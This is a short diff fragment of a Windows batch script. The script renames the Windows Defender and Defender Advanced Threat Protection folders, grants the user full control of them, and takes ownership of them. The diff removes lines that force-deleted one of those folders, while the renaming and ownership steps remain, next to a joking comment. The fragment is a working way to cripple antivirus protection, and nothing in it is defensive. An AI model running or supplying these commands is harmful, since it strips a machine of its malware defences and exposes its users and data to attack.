@@ -35,7 +35,7 @@ cd ..
 cd /
 cd C:/ProgramData/Microsoft
 
-IF EXIST "C:/ProgramData
+
 ren "Windows Defender" please
 ren "Windows Defender Advanced Threat Protection" fruitsnackia
 icacls "please" /grant %username%:f :r
@@ -46,10 +46,6 @@ icacls fruitsnackia /grant %username%:f :r
 takeown /f "fruitsnackia" /r
 
 REM Fruitsnackia..... OMNOMNOM! (if you don't know what this is a reference to... I dont like you, respectfully. Google it if you have a chance.... OK OK I hear you.. back to the task at hand. No need to get all bossy!)
-
-erase /f fruitsnackia /s /q
-erase /f fruitsnackia/*
-
 
 
 
